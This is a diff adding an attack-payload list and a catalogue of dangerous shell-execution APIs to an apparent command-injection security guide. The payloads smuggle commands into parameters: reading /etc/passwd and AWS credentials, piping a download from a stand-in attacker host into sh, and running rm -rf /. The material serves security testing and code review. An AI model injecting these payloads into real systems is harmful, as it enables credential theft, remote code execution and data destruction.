@@ -30,6 +30,122 @@ The unsafe assumption is that user input is a harmless hostname, filename, or fl
 | **Weak controls** | Regex denylist of metacharacters, `shlex.quote` as the only defense |
 | **High impact context** | Processes running as root, container escape paths, shared hosting environments |
 
+## Attack Payloads
+
+Use these payloads in security tests when a parameter reaches a shell or `shell=True` subprocess. Replace `TARGET` with the vulnerable parameter (hostname, filename, report id, etc.).
+
+### Pattern 1: Command separator (`;`)
+
+```text
+TARGET=127.0.0.1; id
+TARGET=127.0.0.1; cat /etc/passwd
+```
+
+Becomes: `ping -c 3 127.0.0.1; id` when embedded in a shell string.
+
+### Pattern 2: Pipes and logical operators (`|`, `||`, `&&`)
+
+```text
+TARGET=127.0.0.1 | whoami
+TARGET=127.0.0.1 && curl https://attacker.example/exfil
+TARGET=false || wget -O- https://attacker.example/s.sh | sh
+```
+
+### Pattern 3: Command substitution (`` `cmd` ``, `$(cmd)`)
+
+```text
+TARGET=$(id)
+TARGET=`cat ~/.aws/credentials`
+```
+
+### Pattern 4: Newline and argument injection
+
+```text
+TARGET=127.0.0.1%0aid
+TARGET=-n 1 127.0.0.1; id
+```
+
+Some parsers treat `%0a` or embedded newlines as extra commands when input is passed to `sh -c`.
+
+### Pattern 5: Path and flag injection (non-shell argv)
+
+Even without a shell, extra argv tokens may be injected when the app splits poorly:
+
+```text
+filename=report.pdf;rm -rf /
+filename=--output=/tmp/pwned
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search the codebase for these call patterns. Any path that concatenates or interpolates user input into the command or enables a shell is a review priority.
+
+### Python
+
+```python
+import os, subprocess
+
+os.system(user_input)
+os.popen(f"convert {user_input}")
+subprocess.call(f"ping -c 3 {host}", shell=True)
+subprocess.run(cmd_string, shell=True)          # cmd_string contains user data
+subprocess.check_output(user_input, shell=True)
+asyncio.create_subprocess_shell(user_cmd)
+```
+
+Also review wrappers: `fabric`, `plumbum`, `invoke.run(..., shell=True)`.
+
+### Java
+
+```java
+Runtime.getRuntime().exec("ping -c 3 " + host);
+Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "ping " + host});
+new ProcessBuilder("/bin/sh", "-c", userCmd).start();
+```
+
+`ProcessBuilder` is safe only when **each argument is fixed or allowlisted**—not when user data is inside `-c` strings.
+
+### C#
+
+```csharp
+Process.Start("cmd.exe", $"/c ping {host}");
+Process.Start(new ProcessStartInfo { FileName = "sh", Arguments = $"-c \"{userCmd}\"" });
+```
+
+Avoid `UseShellExecute = true` with user-influenced `Arguments`.
+
+### JavaScript (Node.js)
+
+```javascript
+const { exec, execSync, spawn } = require('child_process');
+exec(`ping -c 3 ${req.query.host}`);
+execSync(userCmd);
+spawn(userCmd, { shell: true });
+```
+
+### Go
+
+```go
+exec.Command("sh", "-c", "ping -c 3 "+host).Run()
+exec.Command(userBinary, userArgs...).Run() // userArgs contains ; if split wrong
+```
+
+### Shell (scripts invoked by the app)
+
+```bash
+ping -c 3 "$host"           # host='x; id'
+convert "$file"               # unquoted: convert $file
+eval "$user_filter"
+```
+
+### C
+
+```c
+system(user_buffer);
+popen(cmd_line, "r");
+execl("/bin/sh", "sh", "-c", constructed, NULL);
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
